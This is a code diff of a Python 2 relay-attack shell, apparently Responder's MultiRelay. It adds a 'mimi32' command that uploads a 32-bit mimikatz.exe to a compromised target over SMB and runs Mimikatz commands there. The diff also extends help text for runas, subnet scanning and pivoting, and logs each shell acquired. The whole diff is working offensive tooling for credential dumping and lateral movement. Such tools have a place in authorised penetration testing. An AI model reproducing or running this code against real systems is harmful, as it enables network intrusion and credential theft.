@@ -45,9 +45,10 @@ from socket import *
 __version__ = "2.0"
 
 
-MimikatzFilename = "./MultiRelay/bin/mimikatz.exe"
-RunAsFileName    = "./MultiRelay/bin/Runas.exe"
-SysSVCFileName   = "./MultiRelay/bin/Syssvc.exe"
+MimikatzFilename    = "./MultiRelay/bin/mimikatz.exe"
+Mimikatzx86Filename = "./MultiRelay/bin/mimikatz_x86.exe"
+RunAsFileName       = "./MultiRelay/bin/Runas.exe"
+SysSVCFileName      = "./MultiRelay/bin/Syssvc.exe"
 
 
 def UserCallBack(op, value, dmy, parser):
@@ -130,7 +131,8 @@ def ShowHelp():
      print color('runas  Command',8,1)+'     -> Run a command as the currently logged in user. (eg: runas whoami)'
      print color('scan /24',8,1)+'           -> Scan (Using SMB) this /24 or /16 to find hosts to pivot to'
      print color('pivot  IP address',8,1)+'  -> Connect to another host (eg: pivot 10.0.0.12)'
-     print color('mimi  command',8,1)+'      -> Run a remote Mimikatz command (eg: mimi coffee)'
+     print color('mimi  command',8,1)+'      -> Run a remote Mimikatz 64 bits command (eg: mimi coffee)'
+     print color('mimi32  command',8,1)+'    -> Run a remote Mimikatz 32 bits command (eg: mimi coffee)'
      print color('lcmd  command',8,1)+'      -> Run a local command and display the result in MultiRelay shell (eg: lcmd ifconfig)'
      print color('help',8,1)+'               -> Print this message.'
      print color('exit',8,1)+'               -> Exit this shell and return in relay mode.'
@@ -574,6 +576,7 @@ def RunShellCmd(data, s, clientIP, Target, Username, Domain):
         else:
            print "[+] Authenticated.\n[+] Dropping into Responder's interactive shell, type \"exit\" to terminate\n"
            ShowHelp()
+        Logs.info("Client:"+clientIP+", "+Domain+"\\"+Username+" --> Target: "+Target[0]+" -> Shell acquired")
         print color('Connected to %s as LocalSystem.'%(Target[0]),2,1)
 
     while True:
@@ -608,6 +611,7 @@ def RunShellCmd(data, s, clientIP, Target, Username, Domain):
             RunAs   = re.findall('^runas (.*)$', Cmd[0])
             LCmd    = re.findall('^lcmd (.*)$', Cmd[0])
             Mimi    = re.findall('^mimi (.*)$', Cmd[0])
+            Mimi32  = re.findall('^mimi32 (.*)$', Cmd[0])
             Scan    = re.findall('^scan (.*)$', Cmd[0])
             Pivot   = re.findall('^pivot (.*)$', Cmd[0])
             Help    = re.findall('^help', Cmd[0])
@@ -682,6 +686,18 @@ def RunShellCmd(data, s, clientIP, Target, Username, Domain):
                   del Cmd[:]
                else:
                   print MimikatzFilename+" does not exist, please specify a valid file."
+                  del Cmd[:]
+
+            if Mimi32:
+               if os.path.isfile(Mimikatzx86Filename):   
+                  FileSize, FileContent = UploadContent(Mimikatzx86Filename)
+                  FileName = os.path.basename(Mimikatzx86Filename)
+                  data = WriteFile(data, s, FileName,  FileSize, FileContent, Target[0])
+                  Exec = Mimi32[0]
+                  data = RunMimiCmd(data, s, clientIP, Username, Domain, Exec, Logs, Target[0],FileName)
+                  del Cmd[:]
+               else:
+                  print Mimikatzx86Filename+" does not exist, please specify a valid file."
                   del Cmd[:]
 
             if Pivot:
